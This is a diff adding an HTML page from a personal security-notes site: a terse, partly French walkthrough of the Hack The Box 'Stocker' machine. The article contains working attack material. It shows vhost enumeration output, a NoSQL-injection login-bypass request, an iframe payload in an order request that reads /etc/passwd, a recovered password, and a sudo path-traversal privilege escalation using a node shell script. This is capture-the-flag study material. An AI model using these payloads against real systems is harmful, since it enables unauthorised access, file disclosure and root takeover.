@@ -1,0 +1,520 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="Various notes from CTF experience">
+      
+      
+        <meta name="author" content="rebrec">
+      
+      
+        <link rel="canonical" href="https://rebrec.github.io/rebsecnotes/CTF%20-%20Challenges/htb/Stocker/">
+      
+      
+        <link rel="prev" href="../Investigation/">
+      
+      
+      <link rel="icon" href="../../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.4.2, mkdocs-material-9.1.2">
+    
+    
+      
+        <title>Stocker - Rebrec's Sec Notes</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../assets/stylesheets/main.7bf56d0a.min.css">
+      
+        
+        <link rel="stylesheet" href="../../../assets/stylesheets/palette.a0c5b2b5.min.css">
+      
+      
+
+    
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+    <script>__md_scope=new URL("../../..",location),__md_hash=e=>[...e].reduce((e,_)=>(e<<5)-e+_.charCodeAt(0),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+    
+  </head>
+  
+  
+    
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="" data-md-color-accent="">
+  
+    
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../../.." title="Rebrec&#39;s Sec Notes" class="md-header__button md-logo" aria-label="Rebrec's Sec Notes" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2Z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Rebrec's Sec Notes
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Stocker
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+    
+    
+      <label class="md-header__button md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
+      </label>
+      <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41Z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+      <div class="md-header__source">
+        <a href="https://github.com/rebrec/rebsecnotes" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.3.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2023 Fonticons, Inc.--><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81z"/></svg>
+  </div>
+  <div class="md-source__repository">
+    rebrec/rebsecnotes
+  </div>
+</a>
+      </div>
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../../.." title="Rebrec&#39;s Sec Notes" class="md-nav__button md-logo" aria-label="Rebrec's Sec Notes" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"/></svg>
+
+    </a>
+    Rebrec's Sec Notes
+  </label>
+  
+    <div class="md-nav__source">
+      <a href="https://github.com/rebrec/rebsecnotes" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.3.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2023 Fonticons, Inc.--><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81z"/></svg>
+  </div>
+  <div class="md-source__repository">
+    rebrec/rebsecnotes
+  </div>
+</a>
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+      
+
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../test/" class="md-nav__link">
+        Test
+      </a>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+    
+  
+  
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" checked>
+      
+      
+      
+        <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="0">
+          CTF   Challenges
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="true">
+        <label class="md-nav__title" for="__nav_2">
+          <span class="md-nav__icon md-icon"></span>
+          CTF   Challenges
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+    
+  
+  
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_1" checked>
+      
+      
+      
+        <label class="md-nav__link" for="__nav_2_1" id="__nav_2_1_label" tabindex="0">
+          Htb
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_1_label" aria-expanded="true">
+        <label class="md-nav__title" for="__nav_2_1">
+          <span class="md-nav__icon md-icon"></span>
+          Htb
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Investigation/" class="md-nav__link">
+        Investigation
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+    
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        Stocker
+      </a>
+      
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+  
+  
+
+
+  <h1>Stocker</h1>
+
+<p>![[Stocker-1.png]]</p>
+<div class="codehilite"><pre><span></span><code><span class="err">└─</span><span class="c1"># gobuster vhost -u stocker.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --append-domain</span>
+<span class="o">===============================================================</span>
+<span class="n">Gobuster</span><span class="w"> </span><span class="n">v3</span><span class="o">.</span><span class="mi">4</span>
+<span class="n">by</span><span class="w"> </span><span class="n">OJ</span><span class="w"> </span><span class="n">Reeves</span><span class="w"> </span><span class="p">(</span><span class="err">@</span><span class="n">TheColonial</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">Christian</span><span class="w"> </span><span class="n">Mehlmauer</span><span class="w"> </span><span class="p">(</span><span class="err">@</span><span class="n">firefart</span><span class="p">)</span>
+<span class="o">===============================================================</span>
+<span class="p">[</span><span class="o">+</span><span class="p">]</span><span class="w"> </span><span class="n">Url</span><span class="p">:</span><span class="w">             </span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">stocker</span><span class="o">.</span><span class="n">htb</span>
+<span class="p">[</span><span class="o">+</span><span class="p">]</span><span class="w"> </span><span class="n">Method</span><span class="p">:</span><span class="w">          </span><span class="n">GET</span>
+<span class="p">[</span><span class="o">+</span><span class="p">]</span><span class="w"> </span><span class="n">Threads</span><span class="p">:</span><span class="w">         </span><span class="mi">10</span>
+<span class="p">[</span><span class="o">+</span><span class="p">]</span><span class="w"> </span><span class="n">Wordlist</span><span class="p">:</span><span class="w">        </span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">wordlists</span><span class="o">/</span><span class="n">dirbuster</span><span class="o">/</span><span class="n">directory</span><span class="o">-</span><span class="n">list</span><span class="o">-</span><span class="mf">2.3</span><span class="o">-</span><span class="n">medium</span><span class="o">.</span><span class="n">txt</span>
+<span class="p">[</span><span class="o">+</span><span class="p">]</span><span class="w"> </span><span class="n">User</span><span class="w"> </span><span class="n">Agent</span><span class="p">:</span><span class="w">      </span><span class="n">gobuster</span><span class="o">/</span><span class="mf">3.4</span>
+<span class="p">[</span><span class="o">+</span><span class="p">]</span><span class="w"> </span><span class="n">Timeout</span><span class="p">:</span><span class="w">         </span><span class="mi">10</span><span class="n">s</span>
+<span class="p">[</span><span class="o">+</span><span class="p">]</span><span class="w"> </span><span class="n">Append</span><span class="w"> </span><span class="n">Domain</span><span class="p">:</span><span class="w">   </span><span class="bp">true</span>
+<span class="o">===============================================================</span>
+<span class="mi">2023</span><span class="o">/</span><span class="mi">02</span><span class="o">/</span><span class="mi">06</span><span class="w"> </span><span class="mi">23</span><span class="p">:</span><span class="mi">13</span><span class="p">:</span><span class="mi">46</span><span class="w"> </span><span class="n">Starting</span><span class="w"> </span><span class="n">gobuster</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="n">VHOST</span><span class="w"> </span><span class="n">enumeration</span><span class="w"> </span><span class="n">mode</span>
+<span class="o">===============================================================</span>
+<span class="n">Found</span><span class="p">:</span><span class="w"> </span><span class="n">dev</span><span class="o">.</span><span class="n">stocker</span><span class="o">.</span><span class="n">htb</span><span class="w"> </span><span class="n">Status</span><span class="p">:</span><span class="w"> </span><span class="mi">302</span><span class="w"> </span><span class="p">[</span><span class="n">Size</span><span class="p">:</span><span class="w"> </span><span class="mi">28</span><span class="p">]</span><span class="w"> </span><span class="p">[</span><span class="o">--&gt;</span><span class="w"> </span><span class="o">/</span><span class="n">login</span><span class="p">]</span>
+<span class="n">Progress</span><span class="p">:</span><span class="w"> </span><span class="mi">10409</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="mi">220561</span><span class="w"> </span><span class="p">(</span><span class="mf">4.72</span><span class="o">%</span><span class="p">)</span><span class="o">^</span><span class="n">C</span>
+<span class="p">[</span><span class="o">!</span><span class="p">]</span><span class="w"> </span><span class="n">Keyboard</span><span class="w"> </span><span class="n">interrupt</span><span class="w"> </span><span class="n">detected</span><span class="p">,</span><span class="w"> </span><span class="n">terminating</span><span class="o">.</span>
+
+<span class="o">===============================================================</span>
+<span class="mi">2023</span><span class="o">/</span><span class="mi">02</span><span class="o">/</span><span class="mi">06</span><span class="w"> </span><span class="mi">23</span><span class="p">:</span><span class="mi">14</span><span class="p">:</span><span class="mi">15</span><span class="w"> </span><span class="n">Finished</span>
+</code></pre></div>
+
+<p>vhost trouvé via vhost enumeration : dev.stocker.htb</p>
+<p>Bypass de l'authent avec au format JSON une NoSQL injection :</p>
+<div class="codehilite"><pre><span></span><code><span class="nf">POST</span> <span class="nn">/login</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="o">:</span> <span class="l">dev.stocker.htb</span>
+<span class="na">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0</span>
+<span class="na">Accept</span><span class="o">:</span> <span class="l">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span>
+<span class="na">Accept-Language</span><span class="o">:</span> <span class="l">en-US,en;q=0.5</span>
+<span class="na">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate</span>
+<span class="na">Content-Type</span><span class="o">:</span> <span class="l">application/json</span>
+<span class="na">Content-Length</span><span class="o">:</span> <span class="l">54</span>
+<span class="na">Origin</span><span class="o">:</span> <span class="l">http://dev.stocker.htb</span>
+<span class="na">Connection</span><span class="o">:</span> <span class="l">close</span>
+<span class="na">Referer</span><span class="o">:</span> <span class="l">http://dev.stocker.htb/login</span>
+<span class="na">Cookie</span><span class="o">:</span> <span class="l">connect.sid=s%3AFhbvDc7SEo_kF1-Bq2JuLGxucLWMeG5V.8UeivYzWZ%2BTMk30M8JbOTskUP1MWxYSf6%2BW3My5HcCo</span>
+<span class="na">Upgrade-Insecure-Requests</span><span class="o">:</span> <span class="l">1</span>
+
+<span class="p">{</span><span class="nt">&quot;username&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="nt">&quot;$ne&quot;</span><span class="p">:</span><span class="w"> </span><span class="kc">null</span><span class="p">},</span><span class="w"> </span><span class="nt">&quot;password&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="nt">&quot;$ne&quot;</span><span class="p">:</span><span class="w"> </span><span class="kc">null</span><span class="p">}}</span>
+</code></pre></div>
+
+<p>Tentative de SSTI avec ${7*7} et</p>
+<p>Brute force du username : angoose
+Brute force du password : b3e795719e2a644f69838a593dd159ac</p>
+<p>"$;|^{{}}''"</p>
+<p>{"_id":"638f116eeb060210cbd83a93","title":"Toilet Paper","description":"It's toilet paper.","image":"toilet-paper.jpg","price":0.69,"currentStock":4212,"__v":0}</p>
+<p>user length : 7  angoose
+password length : 32 chars   </p>
+<p>il y a un endpoint /api/products
+                            /api/po/</p>
+<ul>
+<li>il y a peut être d'autre endpoint en 2 chars ??</li>
+<li>revoir si on ne peut pas ajouter un product ou en modifier 1 ???</li>
+<li>pour peut être faire une SSTI ou LFI (via l'image) ?</li>
+<li>Voir à rebruteforcer et lister les bad chars (status  != 302)<ul>
+<li>voir ce qu'on pourraît faire avec ca ...?
+                ------------------
+SSFI :</li>
+</ul>
+</li>
+</ul>
+<div class="codehilite"><pre><span></span><code><span class="nf">POST</span> <span class="nn">/api/order</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+
+Host: dev.stocker.htb
+
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+
+Accept: */*
+
+Accept-Language: en-US,en;q=0.5
+
+Accept-Encoding: gzip, deflate
+
+Referer: http://dev.stocker.htb/stock
+
+Content-Type: application/json
+
+Origin: http://dev.stocker.htb
+
+Content-Length: 214
+
+Connection: close
+
+Cookie: connect.sid=s%3Avl0rPp-i53IWRGNVdk7aCDRGnBn-yuyG.InPe1bsghz6TrAW2SEdKTwYuWY%2FTpy0bRLDr3Dh5jME
+
+
+
+{&quot;basket&quot;:[{&quot;_id&quot;:&quot;638f116eeb060210cbd83a8d&quot;,&quot;title&quot;:&quot;&lt;iframe src=/etc/passwd height=900 width=500&gt;&lt;/iframe&gt;&quot;,&quot;description&quot;:&quot;It&#39;s a red cup.&quot;,&quot;image&quot;:&quot;red-cup.jpg&quot;,&quot;price&quot;:32,&quot;currentStock&quot;:4,&quot;__v&quot;:0,&quot;amount&quot;:1}]}
+</code></pre></div>
+
+<p>password : IHeardPassphrasesArePrettySecure (from /var/www/dev/index.js)</p>
+<p>privesc</p>
+<div class="codehilite"><pre><span></span><code><span class="nv">Matching</span><span class="w"> </span><span class="nv">Defaults</span><span class="w"> </span><span class="nv">entries</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="nv">angoose</span><span class="w"> </span><span class="nv">on</span><span class="w"> </span><span class="nv">stocker</span>:
+<span class="w">    </span><span class="nv">env_reset</span>,<span class="w"> </span><span class="nv">mail_badpass</span>,<span class="w"> </span><span class="nv">secure_path</span><span class="o">=/</span><span class="nv">usr</span><span class="o">/</span><span class="nv">local</span><span class="o">/</span><span class="nv">sbin</span>\:<span class="o">/</span><span class="nv">usr</span><span class="o">/</span><span class="nv">local</span><span class="o">/</span><span class="nv">bin</span>\:<span class="o">/</span><span class="nv">usr</span><span class="o">/</span><span class="nv">sbin</span>\:<span class="o">/</span><span class="nv">usr</span><span class="o">/</span><span class="nv">bin</span>\:<span class="o">/</span><span class="nv">sbin</span>\:<span class="o">/</span><span class="nv">bin</span>\:<span class="o">/</span><span class="nv">snap</span><span class="o">/</span><span class="nv">bin</span>
+
+<span class="nv">User</span><span class="w"> </span><span class="nv">angoose</span><span class="w"> </span><span class="nv">may</span><span class="w"> </span><span class="nv">run</span><span class="w"> </span><span class="nv">the</span><span class="w"> </span><span class="nv">following</span><span class="w"> </span><span class="nv">commands</span><span class="w"> </span><span class="nv">on</span><span class="w"> </span><span class="nv">stocker</span>:
+<span class="w">    </span><span class="ss">(</span><span class="nv">ALL</span><span class="ss">)</span><span class="w"> </span><span class="o">/</span><span class="nv">usr</span><span class="o">/</span><span class="nv">bin</span><span class="o">/</span><span class="nv">node</span><span class="w"> </span><span class="o">/</span><span class="nv">usr</span><span class="o">/</span><span class="nv">local</span><span class="o">/</span><span class="nv">scripts</span><span class="cm">/*.js</span>
+</code></pre></div>
+
+<p>using sudo path traversal</p>
+<div class="codehilite"><pre><span></span><code><span class="c1"># cat /tmp/rebrec/shell.js</span>
+const<span class="w"> </span><span class="o">{</span><span class="w"> </span>spawn<span class="w"> </span><span class="o">}</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>require<span class="o">(</span><span class="s1">&#39;child_process&#39;</span><span class="o">)</span>
+const<span class="w"> </span><span class="nv">shell</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>spawn<span class="o">(</span><span class="s1">&#39;sh&#39;</span>,<span class="o">[]</span>,<span class="w"> </span><span class="o">{</span><span class="w"> </span>stdio:<span class="w"> </span><span class="s1">&#39;inherit&#39;</span><span class="w"> </span><span class="o">})</span>
+shell.on<span class="o">(</span><span class="s1">&#39;close&#39;</span>,<span class="o">(</span>code<span class="o">)=</span>&gt;<span class="o">{</span>console.log<span class="o">(</span><span class="s1">&#39;[shell] terminated :&#39;</span>,code<span class="o">)})</span>
+</code></pre></div>
+
+<div class="codehilite"><pre><span></span><code><span class="sb">```</span>sudo<span class="w"> </span>/usr/bin/node<span class="w"> </span>/usr/local/scripts/../../../../../tmp/rebrec/shell.js
+</code></pre></div>
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+        </div>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    <script id="__config" type="application/json">{"base": "../../..", "features": [], "search": "../../../assets/javascripts/workers/search.208ed371.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
+    
+    
+      <script src="../../../assets/javascripts/bundle.fc8c2696.min.js"></script>
+      
+    
+  </body>
+</html>
